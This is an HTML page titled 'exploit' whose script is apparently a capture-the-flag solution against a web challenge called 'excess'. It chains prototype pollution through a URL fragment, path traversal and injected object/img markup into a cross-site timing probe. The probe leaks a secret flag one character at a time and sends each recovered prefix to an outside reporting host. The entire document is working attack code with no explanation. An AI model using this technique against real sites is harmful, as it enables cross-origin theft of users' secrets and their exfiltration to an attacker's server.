<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8"/>
        <title>exploit</title>
    </head>
    <body>
        <script>
const EXCESS_URL = 'http://excess.example:17174';
const INTERNAL_EXCESS_URL = 'http://localhost:31337';

const REPORT_URL = 'http://ngrok.example:12345/report';

async function exploit(flag) {
    const random = Math.random().toString();

    const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

    const constructHtml = prefix => {
        return `<object data='/api/messages?content=${prefix}'><img src='/api/message/${random}%ff' loading='lazy'></object>`;
    };

    const constructBody = html => {
        return `name=${html}&password=x`;
    };

    const constructPollution = body => {
        return [
            ['__proto__', 'headers', [['Range', 'bytes=17-']]],
            ['__proto__', 'method', 'POST'],
            ['__proto__', 'body', body],
        ];
    };

    const register = async body => {
        const url = `${EXCESS_URL}/api/register`;

        await fetch(url, { method: 'POST', body: body, mode: 'cors' });
    };

    const probe = results => {
        return fetch(EXCESS_URL, { method: 'HEAD', mode: 'cors' })
            .then(_ => results.push(1))
            .catch(_ => results.push(0));
    };

    const validate = results => {
        const zeroes = results.filter(result => result == 0);

        return zeroes.length == 0;
    };

    const report = value => {
        const url = `${REPORT_URL}?flag=${value}`;

        return fetch(url, { mode: 'no-cors' });
    };

    const alphabet = '0123456789abcdef-}';

    const wnd = window.open(INTERNAL_EXCESS_URL);

    await sleep(1000);

    for (let i = 0; i < 36; i += 1) {
        let found = false;

        for (let symbol of alphabet) {
            const random = Math.random().toString();
            
            const prefix = flag + symbol;
            const html = constructHtml(prefix);
            const body = constructBody(html);

            await register(body);

            const pollution = constructPollution(body);

            const results = [];
            const promises = [];

            const interval = setInterval(_ => promises.push(probe(results)), 10);

            const url = `${INTERNAL_EXCESS_URL}/message/${random}%2f..%2f..%2fregister#${encodeURIComponent(JSON.stringify(pollution))}`;
            wnd.location.href = url;

            await sleep(1000);
            
            clearInterval(interval);
            await Promise.all(promises);

            if (validate(results)) {
                flag += symbol;
                await report(flag);

                found = true;
                break;
            }
        }

        if (!found) {
            break;
        }
    }
}

exploit('{');
        </script>
    </body>
</html>
